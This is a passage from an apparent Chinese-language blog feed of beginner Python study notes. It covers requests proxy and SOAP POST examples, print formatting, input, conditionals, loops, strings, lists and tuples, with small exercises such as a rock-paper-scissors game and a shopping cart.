<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">proxies &#x3D; &#123;</span><br><span class="line">           &quot;http&quot;: &quot;http:&#x2F;&#x2F;10.10.10.10:8888&quot;,</span><br><span class="line">           &quot;https&quot;: &quot;http:&#x2F;&#x2F;10.10.10.100:4444&quot;,</span><br><span class="line">          &#125;</span><br><span class="line">r &#x3D; requests.get(&#39;http:&#x2F;&#x2F;m.ctrip.com&#39;, proxies&#x3D;proxies)</span><br></pre></td></tr></table></figure>
<p>xml请求</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">headers &#x3D; &#123;&#39;Content-type&#39;: &#39;text&#x2F;xml&#39;&#125;</span><br><span class="line">    XML &#x3D; &#39;&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;&lt;soap:Envelope xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot; xmlns:xsd&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema&quot; xmlns:soap&#x3D;&quot;http:&#x2F;&#x2F;schemas.xmlsoap.org&#x2F;soap&#x2F;envelope&#x2F;&quot;&gt;&lt;soap:Body&gt;&lt;Request xmlns&#x3D;&quot;http:&#x2F;&#x2F;tempuri.org&#x2F;&quot;&gt;&lt;jme&gt;&lt;JobClassFullName&gt;WeChatJSTicket.JobWS.Job.JobRefreshTicket,WeChatJSTicket.JobWS&lt;&#x2F;JobClassFullName&gt;&lt;Action&gt;RUN&lt;&#x2F;Action&gt;&lt;Param&gt;1&lt;&#x2F;Param&gt;&lt;HostIP&gt;127.0.0.1&lt;&#x2F;HostIP&gt;&lt;JobInfo&gt;1&lt;&#x2F;JobInfo&gt;&lt;NeedParallel&gt;false&lt;&#x2F;NeedParallel&gt;&lt;&#x2F;jme&gt;&lt;&#x2F;Request&gt;&lt;&#x2F;soap:Body&gt;&lt;&#x2F;soap:Envelope&gt;&#39;</span><br><span class="line">    url &#x3D; &#39;http:&#x2F;&#x2F;jobws.push.mobile.xxxxxxxx.com&#x2F;RefreshWeiXInTokenJob&#x2F;RefreshService.asmx&#39;</span><br><span class="line">    r &#x3D; requests.post(url,headers&#x3D;headers,data&#x3D;XML)</span><br><span class="line">    #r.encoding &#x3D; &#39;utf-8&#39;</span><br><span class="line">    data &#x3D; r.text</span><br><span class="line">    print data</span><br></pre></td></tr></table></figure>

<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.cnblogs.com/tangdongchu/p/4229049.html" target="_blank" rel="noopener">https://www.cnblogs.com/tangdongchu/p/4229049.html</a></p>
<p><a href="https://blog.csdn.net/lady_killer9/article/details/109032337" target="_blank" rel="noopener">https://blog.csdn.net/lady_killer9/article/details/109032337</a></p>
<p><a href="https://juejin.cn/post/6844904008037957639" target="_blank" rel="noopener">https://juejin.cn/post/6844904008037957639</a></p>
<p><a href="https://blog.csdn.net/qq_41151593/article/details/104578476" target="_blank" rel="noopener">https://blog.csdn.net/qq_41151593/article/details/104578476</a></p>
<p><a href="https://www.liaoxuefeng.com/wiki/1016959663602400/1183249464292448" target="_blank" rel="noopener">https://www.liaoxuefeng.com/wiki/1016959663602400/1183249464292448</a></p>
<p><a href="https://blog.csdn.net/weixin_44799217/article/details/113062756" target="_blank" rel="noopener">https://blog.csdn.net/weixin_44799217/article/details/113062756</a></p>
<p><a href="https://mp.weixin.qq.com/s?__biz=MzU5NjA0ODAyNg==&amp;mid=2247484179&amp;idx=3&amp;sn=2a695394a24eabd1fc1a743312311375&amp;chksm=fe69e2e6c91e6bf0a8ec25807a77bb3d25dfc117cb055957b3d108855944eca21b711dc22103&amp;mpshare=1&amp;scene=23&amp;srcid=10319N8JtkTqaq3BUEGPvKhe&amp;sharer_sharetime=1604394368415&amp;sharer_shareid=a0847c60830277aa59000b154c48d9ab#rd" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzU5NjA0ODAyNg==&amp;mid=2247484179&amp;idx=3&amp;sn=2a695394a24eabd1fc1a743312311375&amp;chksm=fe69e2e6c91e6bf0a8ec25807a77bb3d25dfc117cb055957b3d108855944eca21b711dc22103&amp;mpshare=1&amp;scene=23&amp;srcid=10319N8JtkTqaq3BUEGPvKhe&amp;sharer_sharetime=1604394368415&amp;sharer_shareid=a0847c60830277aa59000b154c48d9ab#rd</a></p>
<p><a href="https://rick11929.github.io/2018/01/23/Python-requests%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener">https://rick11929.github.io/2018/01/23/Python-requests%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a></p>
<p>中文文档：<a href="https://docs.python-requests.org/zh_CN/latest/index.html" target="_blank" rel="noopener">https://docs.python-requests.org/zh_CN/latest/index.html</a> (翻译的有点烂，建议看英文原版)</p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
  </entry>
  <entry>
    <title>Python学习笔记1</title>
    <url>/2021/04/18/Python1/</url>
    <content><![CDATA[<p>在B站看网课重新学一下Python，方便以后写盲注脚本或者一些有意思的脚本，比如爬虫、讲课抢票等等。<a id="more"></a></p>
<h2 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h2><p>1.#单行注释</p>
<p>2.多行注释</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;&#39;&#39;</span><br><span class="line">三个单引号包裹的是多行注释</span><br><span class="line">&#39;&#39;&#39;</span><br></pre></td></tr></table></figure>

<p>多行注释也可以先选中多行然后按<code>Ctrl+/</code>来实现</p>
<p>另外,三个单引号包裹赋值给变量的话表示多行字符串,例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a&#x3D;&#39;&#39;&#39;hello</span><br><span class="line">world&#39;&#39;&#39;</span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure>

<h2 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h2><p>print()函数打印输出</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">print(&quot;hello world&quot;) #end不写默认为\n，即默认自动换行</span><br><span class="line">print(&quot;hello world&quot;,end&#x3D;&#39;&#39;) #不换行输出,end里面也可以写其他的东西</span><br><span class="line">print(&quot;aaa&quot;,&quot;bbb&quot;,&quot;ccc&quot;) #,输出空格来分隔字符串</span><br><span class="line">print(&quot;www&quot;,&quot;baidu&quot;,&quot;com&quot;,sep&#x3D;&quot;.&quot;) #sep是分隔符,输出www.baidu.com</span><br></pre></td></tr></table></figure>

<h3 id="格式化输出"><a href="#格式化输出" class="headerlink" title="格式化输出"></a>格式化输出</h3><p><code>{}</code>和<code>:</code>等等</p>
<h4 id="f-str"><a href="#f-str" class="headerlink" title="f-str"></a>f-str</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import math</span><br><span class="line">name&#x3D;Tianze</span><br><span class="line">print(f&#39;my nickname is &#123;name&#125;&#39;) #f也可以大写</span><br><span class="line">print(f&#39;the value of pi is approximately &#123;math.pi:.3f&#125;&#39;)</span><br></pre></td></tr></table></figure>

<h4 id="str-format"><a href="#str-format" class="headerlink" title="str.format()"></a>str.format()</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">print(&quot;&#123;&#125; &#123;&#125;&quot;.format(&quot;hello&quot;,&quot;world&quot;))</span><br><span class="line">#花括号里不加数字则顺序，加数字可以指定位置，第一个为0</span><br><span class="line">print(&quot;&#123;1&#125; &#123;0&#125;&quot;.format(&quot;hello&quot;,&quot;world&quot;)) #输出world hello</span><br><span class="line">print(&quot;&#123;0&#125; &#123;1&#125; &#123;0&#125;&quot;.format(&quot;hello&quot;,&quot;world&quot;)) #输出hello world hello</span><br><span class="line">#话括号里也可以设置参数</span><br><span class="line">print(&quot;my name is &#123;name&#125;&quot;.format(name&#x3D;&quot;Tianze&quot;))</span><br></pre></td></tr></table></figure>

<h4 id="str-value"><a href="#str-value" class="headerlink" title="str%value"></a>str%value</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">print(&quot;my name is %s&quot;%&quot;Tianze&quot;)</span><br><span class="line">print(&quot;my age is %d&quot;%20)</span><br></pre></td></tr></table></figure>

<h2 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h2><p>input()函数用于输入，输入的值为str类型，若想得到整数类型，要使用int()强制类型转换</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">password&#x3D;input(&quot;请输入你的密码&quot;)</span><br><span class="line">print(type(password)) #type()函数输出变量类型,这里为str</span><br><span class="line">print(&quot;你的密码为&quot;,password)</span><br><span class="line"></span><br><span class="line">a&#x3D;int(input()) #这里int()把输入值强制类型转换为int</span><br><span class="line">print(a+100)</span><br></pre></td></tr></table></figure>

<h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><p>算术运算符(加减乘除等)、比较运算符(== !=等)、位运算符(&amp; |等)、逻辑运算符(and or等)都和其他语言差不多。但python还有成员运算符(in、not in)和身份运算符(is、not is)</p>
<h2 id="条件判断语句"><a href="#条件判断语句" class="headerlink" title="条件判断语句"></a>条件判断语句</h2><p>非0和非空值为True，0或者None为False，需要注意的是True和False必须首字母大写才有意义。</p>
<p>python中else if要写成elif，并且不用<code>{}</code>，而用<code>:</code></p>
<p>python的缩进很重要，尤其是嵌套很多的时候</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if True:</span><br><span class="line">	print(&quot;True&quot;)</span><br><span class="line">else:</span><br><span class="line">	print(&quot;False&quot;)</span><br><span class="line">	</span><br><span class="line">score&#x3D;89</span><br><span class="line">if score&gt;&#x3D;90 and score&lt;&#x3D;100: #这里也可以写成90&lt;&#x3D;score&lt;&#x3D;100</span><br><span class="line">	print(&quot;A&quot;)</span><br><span class="line">elif score&gt;&#x3D;80:</span><br><span class="line">	print(&quot;B&quot;)</span><br><span class="line">elif score&gt;&#x3D;70:</span><br><span class="line">	print(&quot;C&quot;)</span><br><span class="line">elif score&gt;&#x3D;60:</span><br><span class="line">	print(&quot;D&quot;)</span><br><span class="line">else:</span><br><span class="line">	print(&quot;E&quot;)</span><br></pre></td></tr></table></figure>

<h2 id="import和from-import"><a href="#import和from-import" class="headerlink" title="import和from import"></a>import和from import</h2><p>python用<code>import</code>或者<code>from...import</code>来导入模块，相当于用别人写好的一些功能，我们也可以自己写一个py文件，然后导入。</p>
<p>整个模块导入：<code>import module</code></p>
<p>从某个模块中导入某个函数：<code>from module import function</code></p>
<p>从某个模块中导入多个函数：<code>from module import func1,func2</code></p>
<p>导入模块中的所有函数：<code>from module import *</code></p>
<p>as起别名：<code>import module as xxx</code>或者<code>from module import function as xxx</code></p>
<h2 id="random随机库"><a href="#random随机库" class="headerlink" title="random随机库"></a>random随机库</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">x&#x3D;random.randint(0,2) #随机生成[0,2]的数字</span><br><span class="line">print(x)</span><br></pre></td></tr></table></figure>

<h2 id="小练习"><a href="#小练习" class="headerlink" title="小练习"></a>小练习</h2><p>综合使用if语句，实现剪刀石头布游戏效果，显示如下提示信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">请输入:剪刀(0)、石头(1)、布(2):</span><br></pre></td></tr></table></figure>

<p>用户输入数字0-2中的一个，与系统随机生成的数字比较后给出结果信息。</p>
<p>例如：输入0后，显示如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">你的输入为:剪刀(0)</span><br><span class="line">随机生成数字为:1</span><br><span class="line">哈哈,你输了:)</span><br></pre></td></tr></table></figure>

<p>代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import random</span><br><span class="line">a&#x3D;int(input(&quot;请输入:剪刀(0)、石头(1)、布(2):&quot;))</span><br><span class="line">b&#x3D;random.randint(0,2)</span><br><span class="line">print(&quot;随机生成数字为:&#123;&#125;&quot;.format(b))</span><br><span class="line">if a&#x3D;&#x3D;0:</span><br><span class="line">    if b&#x3D;&#x3D;0:</span><br><span class="line">        print(&quot;平局&quot;)</span><br><span class="line">    elif b&#x3D;&#x3D;1:</span><br><span class="line">        print(&quot;哈哈,你输了:)&quot;)</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;哈哈,你赢了:)&quot;)</span><br><span class="line">elif a&#x3D;&#x3D;1:</span><br><span class="line">    if b&#x3D;&#x3D;0:</span><br><span class="line">        print(&quot;哈哈,你赢了:)&quot;)</span><br><span class="line">    elif b&#x3D;&#x3D;1:</span><br><span class="line">        print(&quot;平局&quot;)</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;哈哈,你输了:)&quot;)</span><br><span class="line">else:</span><br><span class="line">    if b&#x3D;&#x3D;0:</span><br><span class="line">        print(&quot;哈哈,你输了:)&quot;)</span><br><span class="line">    elif b&#x3D;&#x3D;1:</span><br><span class="line">        print(&quot;哈哈,你赢了:)&quot;)</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;平局&quot;)</span><br></pre></td></tr></table></figure>

<p>运气真好，第一次运行结果就和示例一样</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210418164205888.png" alt="image-20210418164205888"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.bilibili.com/video/BV12E411A7ZQ" target="_blank" rel="noopener">https://www.bilibili.com/video/BV12E411A7ZQ</a></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
  </entry>
  <entry>
    <title>Python学习笔记2</title>
    <url>/2021/04/19/Python2/</url>
    <content><![CDATA[<p>循环语句、字符串、列表<a id="more"></a></p>
<h2 id="循环语句"><a href="#循环语句" class="headerlink" title="循环语句"></a>循环语句</h2><h3 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h3><p>for 循环可以遍历任何可迭代对象，迭代对象有：字符串、列表、元组、字典等等</p>
<p><code>range()</code>函数返回一个可迭代对象(类型为对象)</p>
<p>range(stop)  start默认从0开始<br>range(start, stop[, step])  左闭右开区间[start,stop) </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#range三种写法</span><br><span class="line">for i in range(5): #[0,5)</span><br><span class="line">for i in range(0,5): #[0,5)</span><br><span class="line">for i in range(0,5,1)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#遍历字符串</span><br><span class="line">city&#x3D;&quot;hangzhou&quot;</span><br><span class="line">for i in city:</span><br><span class="line">	print(i,end&#x3D;&#39;\t&#39;) #end结尾输出</span><br><span class="line">#遍历列表</span><br><span class="line">a&#x3D;[&quot;aa&quot;,&#39;bb&#39;,&#39;cc&#39;,&#39;dd&#39;]</span><br><span class="line">for i in a:</span><br><span class="line">	print(i,end&#x3D;&#39;\t&#39;)</span><br><span class="line">for i in range(len(a)): #列表索引必须是整数</span><br><span class="line">    print(i,a[i])</span><br></pre></td></tr></table></figure>

<p>以求1到100的和为例</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sum&#x3D;0</span><br><span class="line">for i in range(1,101):</span><br><span class="line">	sum+&#x3D;i</span><br><span class="line">print(sum)</span><br></pre></td></tr></table></figure>

<p>用一行输出的简便写法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">print(sum(range(1,101)))</span><br></pre></td></tr></table></figure>

<p>这题在四月份HW面试深信服的时候面试官问过一模一样的问题，当时只知道用for循环所以没答出来印象很深，真是书到用时方恨少。</p>
<h3 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h3><p>语法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">while 判断条件(condition)：</span><br><span class="line">    执行语句(statements)……</span><br></pre></td></tr></table></figure>

<p>python没有do while循环</p>
<p>python中while可以用else语句：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">count&#x3D;0</span><br><span class="line">while count&lt;5:</span><br><span class="line">	print(count,&quot;小于5&quot;)</span><br><span class="line">	count+&#x3D;1 #python没有i++的写法</span><br><span class="line">else:</span><br><span class="line">	print(count,&quot;大于等于5&quot;)</span><br></pre></td></tr></table></figure>

<p>这个else感觉有点鸡肋，意义不大啊，不加也一样。</p>
<h2 id="break、continue、pass"><a href="#break、continue、pass" class="headerlink" title="break、continue、pass"></a>break、continue、pass</h2><p>break结束循环</p>
<p>continue跳过本次循环</p>
<p>pass是空语句，用作占位语句，不做任何事情</p>
<p>用for循环写一个九九乘法表：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for i in range(1,10):</span><br><span class="line">    for j in range(1,i+1):</span><br><span class="line">        print(f&quot;&#123;i&#125;*&#123;j&#125;&#x3D;&#123;i*j&#125;&quot;,end&#x3D;&#39;\t&#39;)</span><br><span class="line">    print(&quot;\n&quot;)</span><br></pre></td></tr></table></figure>

<h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><h3 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h3><p>字符串用单引号、双引号、三引号括起来，特殊字符用<code>\</code>转义，因为单引号在内容上用的比较多(如英文I’m a boy)所以推荐用双引号包裹</p>
<p>python源码文件默认用<code>utf-8</code>编码，字符串用<code>unicode</code>编码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">word&#x3D;&#39;字符串&#39;</span><br><span class="line">sentence&#x3D;&#39;这是一个句子&#39;</span><br><span class="line">paragraph&#x3D;&#39;&#39;&#39;</span><br><span class="line">	这是第一段</span><br><span class="line">	这是第二段</span><br><span class="line">&#39;&#39;&#39; </span><br><span class="line">print(word)</span><br><span class="line">print(sentence)</span><br><span class="line">print(paragraph)</span><br></pre></td></tr></table></figure>

<p>常用转义符：<code>\\</code>、<code>\&#39;</code>、<code>\&quot;</code>、<code>\n</code>、<code>\t</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#my_str&#x3D;&quot;I&#39;m a student.&quot;</span><br><span class="line">my_str&#x3D;&#39;I\&#39;m a student.&#39;</span><br><span class="line">print(my_str)</span><br></pre></td></tr></table></figure>

<p>字符串拼接：</p>
<p><code>+</code>拼接字符串</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">str&#x3D;&quot;hangzhou&quot;</span><br><span class="line">print(str+&quot;,你好&quot;)</span><br></pre></td></tr></table></figure>

<p>字符串截取：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">str&#x3D;&quot;hangzhou&quot;</span><br><span class="line">print(str[0:6]) #切片，从0开始，截取长度为6，左闭右开区间，同range(start,end,step)</span><br><span class="line">print(str[0:7:2])</span><br><span class="line">print(str[3:])</span><br><span class="line">print(str[:5])</span><br><span class="line">print(str*3) #*重复打印</span><br><span class="line">print(&quot;hello\nhangzhou&quot;)</span><br><span class="line">print(r&quot;hello\nhangzhou&quot;) #在字符串前面加r，raw原始字符串不转义内容</span><br></pre></td></tr></table></figure>

<p>字符串方法</p>
<p>一共有40种方法，下面是常用的方法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.decode(&quot;utf-8&quot;)</span><br><span class="line">.encode(&quot;utf-8&quot;)</span><br><span class="line">.isalnum(),所有字符都是字母或数字返回true否则false</span><br><span class="line">.isalpha(),所有字符都是字母返回true否则false</span><br><span class="line">.isdigit(),字符串只包含数字则true否则false</span><br><span class="line">.isnumeric()，字符串只包含数字则true否则false，这个与上面的区别是罗马数字和汉字数字等等不同</span><br><span class="line">.join(seq)方法用于将序列中的元素以指定的字符连接生成一个新的字符串。序列包括字符串、列表和元组</span><br><span class="line">.len(string)获取字符串长度，方便循环</span><br><span class="line">.lstrip([chars])删除左边的空格或指定字符,chars指定字符，默认为空格</span><br><span class="line">.rstrip([chars])删除右边的空格或指定字符,chars指定字符，默认为空格</span><br><span class="line">.split(str&#x3D;&quot;&quot;, num&#x3D;string.count(str))通过指定分隔符对字符串进行切片，如果第二个参数 num 有指定值，则分割为 num+1 个子字符串。和join正好相反</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">s1&#x3D;&quot;-&quot;</span><br><span class="line">s2&#x3D;&quot;&quot;</span><br><span class="line">seq&#x3D;(&quot;z&quot;,&quot;w&quot;,&quot;h&quot;)</span><br><span class="line">print(s1.join(seq)) #输出z-w-h</span><br><span class="line">print(s2.join(seq)) #输出zwh</span><br><span class="line"></span><br><span class="line">str &#x3D; &quot;this is string example....wow!!!&quot;</span><br><span class="line">print (str.split( ))       # 以空格为分隔符</span><br><span class="line">print (str.split(&#39;i&#39;,1))   # 以 i 为分隔符</span><br><span class="line">print (str.split(&#39;w&#39;))     # 以 w 为分隔符</span><br><span class="line">#输出如下:</span><br><span class="line">#[&#39;this&#39;, &#39;is&#39;, &#39;string&#39;, &#39;example....wow!!!&#39;]</span><br><span class="line">#[&#39;th&#39;, &#39;s is string example....wow!!!&#39;]</span><br><span class="line">#[&#39;this is string example....&#39;, &#39;o&#39;, &#39;!!!&#39;]</span><br></pre></td></tr></table></figure>

<h3 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h3><p>列表用<code>[]</code>表示，用逗号分隔元素，列表元素类型可以不同，支持数字、字符串甚至可以嵌套列表</p>
<p>列表元素用下标访问，下标从0开始，-1为末尾</p>
<p>列表可以用<code>+</code>拼接，用<code>*</code>重复，用<code>[ : : ]</code>切片，用for循环遍历列表</p>
<p>用法示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">list0&#x3D;[&#39;a&#39;,1]</span><br><span class="line">list1&#x3D;[&#39;b&#39;,2]</span><br><span class="line">list2&#x3D;list0+list1 #list2&#x3D;[&#39;a&#39;,1,&#39;b&#39;,2]</span><br><span class="line">print(list2[0:4:2]) #输出[&#39;a&#39;,&#39;b&#39;]</span><br><span class="line">print(list0[0]) #输出a</span><br><span class="line"></span><br><span class="line">for i in list2:</span><br><span class="line">	print(i)</span><br><span class="line"></span><br><span class="line"># while循环可以操作它的下标,for循环不行</span><br><span class="line">i&#x3D;0</span><br><span class="line">while i&lt;len(list2):</span><br><span class="line">	print(&quot;第&#123;&#125;个为:&#123;&#125;&quot;.format(i,list2[i]))</span><br><span class="line">	i+&#x3D;1</span><br></pre></td></tr></table></figure>

<p>常用方法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#增:</span><br><span class="line">list0&#x3D;[1,2]</span><br><span class="line">list1&#x3D;[3,4]</span><br><span class="line">list0.append(5) #将元素添加到末尾</span><br><span class="line">list0.append(list1) #将列表当作一个元素添加到末尾</span><br><span class="line">list0.extend(list1) #将列表中每个元素依次加入末尾</span><br><span class="line">list0.insert(1,2) #insert(下标,元素) 指定位置前插入</span><br><span class="line"></span><br><span class="line">#删:</span><br><span class="line">moviename&#x3D;[&quot;加勒比海盗&quot;,&quot;骇客帝国&quot;,&quot;第一滴血&quot;,&quot;指环王&quot;,&quot;速度与激情&quot;,&quot;指环王&quot;]</span><br><span class="line">del moviename[2] #指定位置删除或者整体删除del moviename</span><br><span class="line">del moviename #删除整个列表</span><br><span class="line">moviename.pop() #弹出末尾元素,可赋给变量</span><br><span class="line">moviename.remove(&quot;指环王&quot;) #删除匹配到的第一个元素</span><br><span class="line"></span><br><span class="line">#改:</span><br><span class="line">namelist&#x3D;[&quot;小张&quot;,&quot;小王&quot;,&quot;小李&quot;]</span><br><span class="line">namelist[1]&#x3D;&quot;小何&quot; #直接修改指定下标的内容就行</span><br><span class="line">print(namelist) #输出[&quot;小张&quot;,&quot;小何&quot;,&quot;小李&quot;]</span><br><span class="line"></span><br><span class="line">#查:在不在的意思 用in&#x2F;not in判断</span><br><span class="line">namelist&#x3D;[&quot;小张&quot;,&quot;小王&quot;,&quot;小李&quot;]</span><br><span class="line">findName&#x3D;input(&quot;请输入要查找的姓名：&quot;)</span><br><span class="line">if findName in namelist:</span><br><span class="line">    print(&quot;找到&quot;)</span><br><span class="line">else:</span><br><span class="line">    print(&quot;没找到&quot;)</span><br><span class="line">mylist&#x3D;[&quot;a&quot;,&quot;b&quot;,&quot;c&quot;,&quot;a&quot;,&quot;b&quot;]</span><br><span class="line">print(mylist.index(&quot;a&quot;,1,4)) #可以查找指定下标范围的元素并返回找到对应数据的下标</span><br><span class="line">print(mylist.index(&quot;a&quot;,1,3)) #左闭右开区间[1,3),找不到会报错</span><br><span class="line">print(mylist.count(&quot;b&quot;)) #统计某个元素个数</span><br><span class="line"></span><br><span class="line">#排:</span><br><span class="line">a&#x3D;[1,2,3,4]</span><br><span class="line">print(a) #输出[1,2,3,4]</span><br><span class="line">a.reverse() #将列表元素反转</span><br><span class="line">print(a) #输出[4,3,2,1]</span><br><span class="line">a.sort() #升序排序</span><br><span class="line">print(a) #输出[1,2,3,4]</span><br><span class="line">a.sort(reverse&#x3D;True) #降序</span><br><span class="line">print(a) #输出[4,3,2,1]</span><br></pre></td></tr></table></figure>

<p>嵌套列表：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">schoolnames&#x3D;[[&quot;北京大学&quot;,&quot;清华大学&quot;],[&quot;浙江大学&quot;,&quot;杭州电子科技大学&quot;],[&quot;浙江师范大学&quot;,&quot;浙江工业大学&quot;]]</span><br><span class="line">print(schoolnames[0]) #输出[&#39;北京大学&#39;, &#39;清华大学&#39;]</span><br><span class="line">print(schoolnames[0][1]) #相当于二维数组差不多,输出清华大学</span><br></pre></td></tr></table></figure>

<h2 id="小练习"><a href="#小练习" class="headerlink" title="小练习"></a>小练习</h2><h3 id="练习一"><a href="#练习一" class="headerlink" title="练习一"></a>练习一</h3><p>把8个老师随机分配到3个办公室</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import random</span><br><span class="line">offices&#x3D;[[],[],[]]</span><br><span class="line">teachers&#x3D;[&quot;A&quot;,&quot;B&quot;,&quot;C&quot;,&quot;D&quot;,&quot;E&quot;,&quot;F&quot;,&quot;G&quot;,&quot;H&quot;]</span><br><span class="line">for teacher in teachers:</span><br><span class="line">	index&#x3D;random.randint(0,2)</span><br><span class="line">	offices[index].append(teacher)</span><br><span class="line">i&#x3D;1</span><br><span class="line">for office in offices:</span><br><span class="line">	print(f&quot;办公室&#123;i&#125;的人数为:&#123;len(office)&#125;&quot;)</span><br><span class="line">	i+&#x3D;1</span><br><span class="line">	for teacher in office:</span><br><span class="line">		print(f&quot;&#123;teacher&#125;&quot;,end&#x3D;&#39;\t&#39;)</span><br><span class="line">	print(&quot;\n&quot;)</span><br><span class="line">	print(&quot;-&quot;*30)</span><br></pre></td></tr></table></figure>

<h3 id="练习二"><a href="#练习二" class="headerlink" title="练习二"></a>练习二</h3><p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210419215034179.png" alt="image-20210419215034179"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">products&#x3D;[[&quot;iphone&quot;,6888],[&quot;MacPro&quot;,14800],[&quot;小米6&quot;,2499],[&quot;Coffee&quot;,31],[&quot;Book&quot;,60],[&quot;Nike&quot;,699]]</span><br><span class="line">i&#x3D;0</span><br><span class="line">print(&quot;-&quot;*6,end&#x3D;&#39;\t&#39;)</span><br><span class="line">print(&quot;商品列表&quot;,end&#x3D;&quot;\t&quot;)</span><br><span class="line">print(&quot;-&quot;*6,end&#x3D;&#39;\n&#39;)</span><br><span class="line">for product in products:</span><br><span class="line">    print(&quot;&#123;&#125;&quot;.format(i),end&#x3D;&#39;\t&#39;)</span><br><span class="line">    i+&#x3D;1</span><br><span class="line">    for x in product:</span><br><span class="line">        print(&quot;&#123;&#125;&quot;.format(x),end&#x3D;&#39;\t\t&#39;)</span><br><span class="line">    print(&quot;\n&quot;)</span><br><span class="line"></span><br><span class="line">prod&#x3D;[]</span><br><span class="line">sum&#x3D;0</span><br><span class="line">while 1:</span><br><span class="line">    tem&#x3D;input(&quot;请输入想买的商品编号：&quot;)</span><br><span class="line">    if(tem&#x3D;&#x3D;&#39;q&#39;):</span><br><span class="line">        print(&quot;购物车商品有：&quot;,end&#x3D;&#39;&#39;)</span><br><span class="line">        for i in prod:</span><br><span class="line">            print(&quot;&#123;&#125;&quot;.format(i),end&#x3D;&#39; &#39;)</span><br><span class="line">        print(&quot;总价格为：&#123;&#125;&quot;.format(sum))</span><br><span class="line">        break</span><br><span class="line">    else:</span><br><span class="line">        prod.append(products[int(tem)][0])</span><br><span class="line">        sum+&#x3D;products[int(tem)][1]</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
  </entry>
  <entry>
    <title>Python学习笔记3</title>
    <url>/2021/04/20/Python3/</url>
    <content><![CDATA[<p>续2，元组、字典、集合,函数以及文件操作<a id="more"></a></p>
<h2 id="元组tuple"><a href="#元组tuple" class="headerlink" title="元组tuple"></a>元组tuple</h2><p>用小括号<code>()</code>表示，逗号分隔元素，可以混合不同类型数据</p>
<p>元组的元素不可变，但可以包含可变对象，如list</p>
<p>可切片，可for遍历</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">t&#x3D;(1) #括号会解析成表达式的一部分，数学运算的括号</span><br><span class="line">print(type(t)) # int</span><br><span class="line">t&#x3D;(1,) #元组里只有一个数据时，为了让它知道里面不是一个普通的数值  加,表示元组</span><br><span class="line">print(type(t)) # tuple</span><br><span class="line">t&#x3D;(1,&quot;ss&quot;)</span><br><span class="line">print(t)</span><br></pre></td></tr></table></figure>

<p>增：不能在原有的基础上增加，只能通过+连接新建，相当于增加</p>
